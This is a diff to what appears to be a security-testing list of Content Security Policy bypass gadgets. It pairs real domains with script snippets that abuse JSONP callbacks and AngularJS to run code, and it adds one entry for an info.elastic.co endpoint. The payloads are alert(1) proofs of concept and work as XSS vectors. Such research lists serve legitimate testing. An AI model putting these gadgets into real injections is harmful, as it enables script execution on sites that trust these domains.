@@ -62,6 +62,7 @@ gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle
 gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
 gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>
 ib.adnxs.com	<script src="https://ib.adnxs.com/async_usersync?cbfn=alert(1)-"></script>
+info.elastic.co	<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>
 inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
 mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
